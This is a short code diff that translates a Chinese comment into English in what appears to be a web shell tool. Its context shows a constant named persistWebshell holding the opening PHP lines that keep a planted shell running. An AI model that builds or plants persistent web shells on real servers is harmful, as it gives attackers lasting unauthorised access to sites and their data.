@@ -57,7 +57,7 @@ if($name == "") {
 }
 `
 
-// 这里可能是在eval中执行，__FILE__的值不代表文件路径
+// This may run under eval; __FILE__ does not represent a real file path
 const persistWebshell = `
 ignore_user_abort(true);
 set_time_limit(0);
